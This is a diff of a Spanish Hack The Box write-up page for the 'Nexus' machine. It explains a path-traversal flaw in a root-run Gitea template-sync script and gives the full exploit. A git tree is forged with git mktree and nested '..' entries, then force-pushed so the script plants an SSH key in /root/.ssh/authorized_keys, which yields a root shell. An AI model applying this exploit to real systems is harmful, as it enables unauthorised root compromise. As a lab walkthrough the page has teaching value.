-            os.chmod(target, 0o755)                        # incluso con bit de ejecución
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">sync_template</span><span class="p">(</span><span class="n">repo_info</span><span class="p">):</span>
+<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>    <span class="n">owner</span> <span class="o">=</span> <span class="n">repo_info</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">][</span><span class="s1">&#39;login&#39;</span><span class="p">]</span>
+<a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>    <span class="n">name</span> <span class="o">=</span> <span class="n">repo_info</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+<a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>    <span class="o">...</span>
+<a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>    <span class="n">stage_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">STAGING_DIR</span><span class="p">,</span> <span class="n">owner</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>   <span class="c1"># /home/git/template-staging/&lt;owner&gt;/&lt;name&gt;</span>
+<a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>    <span class="o">...</span>
+<a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>    <span class="k">for</span> <span class="n">mode</span><span class="p">,</span> <span class="n">objhash</span><span class="p">,</span> <span class="n">filepath</span> <span class="ow">in</span> <span class="n">entries</span><span class="p">:</span>
+<a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>        <span class="n">target</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">stage_path</span><span class="p">,</span> <span class="n">filepath</span><span class="p">)</span>       <span class="c1"># &lt;-- filepath NO se sanea</span>
+<a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>        <span class="n">target_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">target_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>            <span class="c1"># crea directorios como root</span>
+<a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>        <span class="o">...</span>
+<a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>                     <span class="c1"># escribe como root</span>
+<a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cat_result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+<a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a>        <span class="k">if</span> <span class="n">mode</span> <span class="o">==</span> <span class="s1">&#39;100755&#39;</span><span class="p">:</span>
+<a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>            <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mo">0o755</span><span class="p">)</span>                        <span class="c1"># incluso con bit de ejecución</span>
+</code></pre></div>
 <p>El fallo está en que <strong><code>filepath</code> proviene directamente de <code>git ls-tree</code> y no se valida</strong>. Si uno de los ficheros del repositorio <em>template</em> tiene una ruta con <em>path traversal</em> (<code>../../../...</code>), el <code>os.path.join(stage_path, filepath)</code> genera una ruta que, al resolverse en el sistema de ficheros, <strong>sale del directorio de <em>staging</em> y apunta a cualquier ubicación del sistema</strong>. Como el proceso corre como root y además crea los directorios intermedios (<code>os.makedirs</code>), disponemos de una <strong>escritura de ficheros arbitraria como root</strong> (CWE-22).</p>
 <p>El plan de explotación es, por tanto:</p>
 <ol>
@@ -1753,53 +1806,53 @@ TimeoutStartSec=50s
 <li>Esperar a que el <em>timer</em> ejecute el <em>sync</em> (≤ 1 minuto) y conectarnos por SSH como <code>root</code>.</li>
 </ol>
 <p>El único reto técnico es que Git no permite, por las vías normales, versionar un fichero cuya ruta contenga <code>..</code>. Lo resolveremos construyendo el árbol de Git manualmente con comandos de <em>plumbing</em> (<code>git mktree</code>).</p>
-<h3 id="explotacion-escritura-arbitraria-como-root-via-repo-template">Explotación: escritura arbitraria como root vía repo template</h3>
+<h3 id="explotacion-escritura-arbitraria-como-root-via-repo-template">Explotación: escritura arbitraria como root vía repo template<a class="headerlink" href="#explotacion-escritura-arbitraria-como-root-via-repo-template" title="Permanent link">&para;</a></h3>
 <p><strong>1. Generamos una clave SSH</strong> que colocaremos en el <code>authorized_keys</code> de root:</p>
-<pre><code class="language-bash">ssh-keygen -t ed25519 -f root_key -N ''
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-f<span class="w"> </span>root_key<span class="w"> </span>-N<span class="w"> </span><span class="s1">&#39;&#39;</span>
+</code></pre></div>
 <p><strong>2. Creamos el repositorio en Gitea</strong> (como <code>jones</code>), inicializándolo con un README.
 <img alt="cap14" src="cap14.png" /></p>
 <p>Importante lo marcamos como <strong>Template</strong> en <em>Settings</em> (requisito para que el script lo procese). Lo verificamos por API:</p>
-<pre><code class="language-bash">curl -s &quot;http://git.nexus.htb/api/v1/repos/jones/hackeado&quot; | grep -o '&quot;template&quot;:[a-z]*'
-</code></pre>
-<pre><code class="language-text">&quot;template&quot;:true
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://git.nexus.htb/api/v1/repos/jones/hackeado&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;&quot;template&quot;:[a-z]*&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>&quot;template&quot;:true
+</code></pre></div>
 <p><img alt="cap15" src="cap15.png" /></p>
 <p><strong>3. Forjamos el árbol malicioso.</strong> Como Git no permite versionar rutas con <code>..</code> por las vías habituales, construimos el árbol a mano con <em>plumbing</em> (<code>git mktree</code>), anidando directorios <code>..</code> hasta salir del <em>staging</em> y alcanzar <code>/root/.ssh/authorized_keys</code>:</p>
-<pre><code class="language-bash">git clone http://jones:'&lt;PASSWORD&gt;'@git.nexus.htb/jones/hackeado.git
-cd hackeado
-
-# blob con nuestra clave pública
-blob=$(git hash-object -w ../root_key.pub)
-
-# Árbol real: root/.ssh/authorized_keys
-t=$(printf '100644 blob %s\tauthorized_keys\n' &quot;$blob&quot; | git mktree)
-t=$(printf '040000 tree %s\t.ssh\n'            &quot;$t&quot;   | git mktree)
-t=$(printf '040000 tree %s\troot\n'            &quot;$t&quot;   | git mktree)
-
-# Prefijo de path traversal: 6 niveles de '..' para remontar hasta '/'
-for i in $(seq 1 6); do t=$(printf '040000 tree %s\t..\n' &quot;$t&quot; | git mktree); done
-
-# Commit y push forzado a la rama por defecto
-c=$(git commit-tree &quot;$t&quot; -m pwn)
-git push -f origin &quot;${c}:refs/heads/main&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>git<span class="w"> </span>clone<span class="w"> </span>http://jones:<span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span>@git.nexus.htb/jones/hackeado.git
+<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nb">cd</span><span class="w"> </span>hackeado
+<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>
+<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="c1"># blob con nuestra clave pública</span>
+<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="nv">blob</span><span class="o">=</span><span class="k">$(</span>git<span class="w"> </span>hash-object<span class="w"> </span>-w<span class="w"> </span>../root_key.pub<span class="k">)</span>
+<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>
+<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="c1"># Árbol real: root/.ssh/authorized_keys</span>
+<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="nv">t</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;100644 blob %s\tauthorized_keys\n&#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$blob</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>git<span class="w"> </span>mktree<span class="k">)</span>
+<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="nv">t</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;040000 tree %s\t.ssh\n&#39;</span><span class="w">            </span><span class="s2">&quot;</span><span class="nv">$t</span><span class="s2">&quot;</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>git<span class="w"> </span>mktree<span class="k">)</span>
+<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="nv">t</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;040000 tree %s\troot\n&#39;</span><span class="w">            </span><span class="s2">&quot;</span><span class="nv">$t</span><span class="s2">&quot;</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>git<span class="w"> </span>mktree<span class="k">)</span>
+<a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>
+<a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a><span class="c1"># Prefijo de path traversal: 6 niveles de &#39;..&#39; para remontar hasta &#39;/&#39;</span>
+<a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nv">t</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;040000 tree %s\t..\n&#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$t</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>git<span class="w"> </span>mktree<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+<a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>
+<a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a><span class="c1"># Commit y push forzado a la rama por defecto</span>
+<a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a><span class="nv">c</span><span class="o">=</span><span class="k">$(</span>git<span class="w"> </span>commit-tree<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$t</span><span class="s2">&quot;</span><span class="w"> </span>-m<span class="w"> </span>pwn<span class="k">)</span>
+<a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>git<span class="w"> </span>push<span class="w"> </span>-f<span class="w"> </span>origin<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">c</span><span class="si">}</span><span class="s2">:refs/heads/main&quot;</span>
+</code></pre></div>
 <blockquote>
 <p><strong>Nota (zsh):</strong> hay que escribir <code>"${c}:refs/heads/main"</code> con llaves. Sin ellas, zsh interpreta <code>:r</code> como un modificador de expansión y rompe el <em>refspec</em>.</p>
 </blockquote>
 <p>Al hacer el <em>push</em>, el propio Git nos confirma indirectamente que el <em>traversal</em> está en el árbol, al intentar leer atributos <strong>fuera</strong> del repositorio:</p>
-<pre><code class="language-text">advertencia: no es posible acceder '../../../../../../root/.ssh/.gitattributes': Permiso denegado
-...
- + b073ac2...c7b6f7f  c7b6f7f...  -&gt; main (forced update)
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>advertencia: no es posible acceder &#39;../../../../../../root/.ssh/.gitattributes&#39;: Permiso denegado
+<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>...
+<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a> + b073ac2...c7b6f7f  c7b6f7f...  -&gt; main (forced update)
+</code></pre></div>
 <p><strong>4. Esperamos a que salte el <em>timer</em></strong> (≤ 1 minuto). El servicio, corriendo como root, lee nuestro repo <em>template</em>, extrae el fichero siguiendo la ruta con <code>..</code> y escribe nuestra clave pública en <code>/root/.ssh/authorized_keys</code> (creando el directorio <code>.ssh</code> por el camino). Nos conectamos por SSH como <strong>root</strong>:</p>
-<pre><code class="language-bash">ssh -i root_key root@nexus.htb
-</code></pre>
-<pre><code class="language-text">root@nexus:~# whoami
-root
-root@nexus:~# cat /root/root.txt
-[REDACTED]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>root_key<span class="w"> </span>root@nexus.htb
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>root@nexus:~# whoami
+<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>root
+<a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>root@nexus:~# cat /root/root.txt
+<a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>[REDACTED]
+</code></pre></div>
 <p><img alt="cap16" src="cap16.png" /></p>
 <hr />
 <div align="center">
@@ -1814,6 +1867,9 @@ root@nexus:~# cat /root/root.txt
 
 
 
+  
+  
+
 
 
 
@@ -1827,18 +1883,92 @@ root@nexus:~# cat /root/root.txt
 <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
         
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
       </main>
       
         <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../Enigma/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Enigma">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                Enigma
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../Medium/Checkpoint/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: Checkpoint">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                Checkpoint
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
+    <div class="md-copyright__highlight">
+      © 2026 D4vKry · Contenido con fines educativos en entornos controlados
+    </div>
   
-    Made with
-    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-      Material for MkDocs
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/D4vKry" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://app.hackthebox.com/public/users/2410065" target="_blank" rel="noopener" title="Hack The Box" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://es.linkedin.com/in/david-veiga-otero-160036257" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
     </a>
   
 </div>
@@ -1856,7 +1986,7 @@ root@nexus:~# cat /root/root.txt
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.top", "navigation.footer", "navigation.tracking", "toc.follow", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
       <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
